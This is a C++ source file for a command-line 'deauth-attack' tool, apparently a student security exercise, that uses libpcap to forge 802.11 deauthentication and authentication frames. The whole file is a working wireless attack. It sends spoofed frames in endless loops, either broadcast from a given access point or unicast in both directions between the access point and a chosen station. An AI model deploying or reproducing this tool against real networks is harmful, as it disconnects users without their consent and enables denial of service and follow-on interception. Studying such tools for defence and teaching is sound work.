#include "main.h"
#include <iostream>


void usage(){ //경고 메시지
    printf("syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n");
    printf("deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

int Deauth_packet_make(struct Deauth* deauth, char* ap_mac, char* station_mac) { //Deauth_packet 생성
    deauth->radiotap.revision =0;
    deauth->radiotap.pad =0;
    deauth->radiotap.length = 8;
    deauth->radiotap.Present_flags = 0x00000000;
    deauth->deauthentication.type = htons(0xc000);
    if (station_mac == NULL) deauth->deauthentication.dst_addr = Mac("ff:ff:ff:ff:ff:ff");
    else deauth->deauthentication.dst_addr = Mac(station_mac);
    deauth->deauthentication.src_addr = Mac(ap_mac);
    deauth->deauthentication.BSSID = Mac(ap_mac);
    deauth->deauthentication.number = 0;
    deauth->wireless.reason_code = htons(0x0700);

    return 0;
}

int send_packet(pcap_t* pcap, struct Deauth* deauth){
    while (true) {
        int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(deauth), sizeof(Deauth));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
            return -1;
        }
        std::cout << "Sending DeAuth to AP broadcast -- BBSID: "<< std::string(deauth->deauthentication.bssid()) <<std::endl;
        sleep(0.5);
    }
}

int send_packet2(pcap_t* pcap, struct Deauth* deauth, char* ap_mac, char* station_mac){
    while (true) {
        deauth->deauthentication.dst_addr = Mac(station_mac);
        deauth->deauthentication.src_addr = Mac(ap_mac);
        deauth->deauthentication.BSSID = Mac(ap_mac);
        int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(deauth), sizeof(Deauth));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
            return -1;
        }
        std::cout << "Sending DeAuth to AP unicast -- BBSID: "<< std::string(deauth->deauthentication.bssid()) <<std::endl;
        sleep(0.5);
        deauth->deauthentication.dst_addr = Mac(ap_mac);
        deauth->deauthentication.src_addr = Mac(station_mac);
        deauth->deauthentication.BSSID = Mac(station_mac);
        int res2 = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(deauth), sizeof(Deauth));
        if (res2 != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(pcap));
            return -1;
        }
        std::cout << "Sending DeAuth to station unicast -- BBSID: "<< std::string(deauth->deauthentication.bssid()) <<std::endl;
        sleep(0.5);
    }
}

int Auth_packet_make(struct Auth* auth, char* ap_mac, char* station_mac) { //auth_packet 발송
    auth->radiotap.revision =0;
    auth->radiotap.pad =0;
    auth->radiotap.length = 8;
    auth->radiotap.Present_flags = 0x00000000;
    auth->deauthentication.type = htons(0xb000);
    if (station_mac == NULL) auth->deauthentication.dst_addr = Mac("ff:ff:ff:ff:ff:ff");
    else auth->deauthentication.dst_addr = Mac(station_mac);
    auth->deauthentication.src_addr = Mac(ap_mac);
    auth->deauthentication.BSSID = Mac(ap_mac);
    auth->deauthentication.number = 0;
    auth->wireless.algo = 0x0000;
    auth->wireless.sequence_number = htons(0x0100);
    auth->wireless.status = 0x0000;

    return 0;
}

int send_packet_auth(pcap_t* pcap, struct Auth* auth){
    while (true) {
        int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(auth), sizeof(Auth));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
            return -1;
        }
        std::cout << "Sending Auth to AP broadcast -- BBSID: "<< std::string(auth->deauthentication.bssid()) <<std::endl;
        sleep(0.5);
    }
}

int send_packet2_auth(pcap_t* pcap, struct Auth* auth, char* ap_mac, char* station_mac){
    while (true) {
        auth->deauthentication.dst_addr = Mac(station_mac);
        auth->deauthentication.src_addr = Mac(ap_mac);
        auth->deauthentication.BSSID = Mac(ap_mac);
        int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(auth), sizeof(Auth));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
            return -1;
        }
        std::cout << "Sending Auth to AP unicast -- BBSID: "<< std::string(auth->deauthentication.bssid()) <<std::endl;
        sleep(0.5);
        auth->deauthentication.dst_addr = Mac(ap_mac);
        auth->deauthentication.src_addr = Mac(station_mac);
        auth->deauthentication.BSSID = Mac(station_mac);
        int res2 = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(auth), sizeof(auth));
        if (res2 != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(pcap));
            return -1;
        }
        std::cout << "Sending Auth to station unicast -- BBSID: "<< std::string(auth->deauthentication.bssid()) <<std::endl;
        sleep(0.5);
    }
}

pcap_t* PcapOpen(char* dev) {   //패킷 오픈
    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "error: pcap_open_live(%s) return null - %s\n", dev, errbuf);
        return NULL;
    }

    return pcap;
}

int AP_broadcast_frame(char* dev, struct Deauth* deauth, struct Auth* auth, char* ap_mac, int option){ //AP_broadcast_fram
    pcap_t* pcap = PcapOpen(dev);
    if (pcap == NULL){
        return -1;
    }

    if (option == 0){
        Deauth_packet_make(deauth, ap_mac, NULL);
        send_packet(pcap, deauth);
    } else if (option == 1){
        Auth_packet_make(auth, ap_mac, NULL);
        send_packet_auth(pcap, auth);
    } 
    
    pcap_close(pcap);
    return 0;
}

int AP_unicast_Station(char* dev, struct Deauth* deauth, struct Auth* auth, char* ap_mac, char* station_mac, int option){
    pcap_t* pcap = PcapOpen(dev);
    if (pcap == NULL){
        return -1;
    }

     if (option == 0){
        Deauth_packet_make(deauth, ap_mac, NULL);
        send_packet2(pcap, deauth, ap_mac, station_mac);
    } else if (option == 1){
        Auth_packet_make(auth, ap_mac, NULL);
        send_packet2_auth(pcap, auth, ap_mac, station_mac);
    } 
    
    pcap_close(pcap);
    return 0;
}

int main(int argc, char** argv) {
    char* dev;
    char* ap_mac;
    char* station_mac;
    struct Deauth* deauth = (struct Deauth*)malloc(sizeof(struct Deauth));
    struct Auth* auth = (struct Auth*)malloc(sizeof(struct Auth));

    if (argc < 3) {
        usage();
        return -1;
    } else{
        dev = *(argv + 1); //interface
        ap_mac = *(argv + 2); 
    } 
    
    if(argc == 3) {
        AP_broadcast_frame(dev, deauth, auth, ap_mac, 0);
    } else if(argc == 4) {
        if(strcmp(*(argv+3), "-auth") == 0){
            AP_broadcast_frame(dev, deauth, auth, ap_mac, 1);
        } else {
            station_mac = *(argv + 3);
            AP_unicast_Station(dev, deauth, auth, ap_mac, station_mac, 0);
        }
    } else if(argc == 5) {
        if(strcmp(*(argv+4), "-auth") == 0){
            station_mac = *(argv + 3);
            AP_unicast_Station(dev, deauth, auth, ap_mac, station_mac, 1);
        } else usage();
    }
    free(auth);
    free(deauth);
    return 0;
}
